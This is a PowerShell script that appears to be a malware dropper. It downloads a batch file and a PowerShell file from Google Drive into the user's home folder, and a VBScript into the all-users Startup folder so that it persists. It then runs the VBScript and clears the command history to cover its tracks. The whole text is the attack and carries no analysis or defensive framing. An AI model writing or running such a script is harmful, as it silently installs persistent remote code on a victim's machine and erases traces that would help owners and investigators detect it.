cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ZTZxvMinJVQJBwa4gRCxdGnz4eo_MUDv" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=12qElj9lDxMST2t7EsKmljDDa6AR9h_JT" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1TiujQ7R1q7EaTFaUXbOkdCQuwuwksriP" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit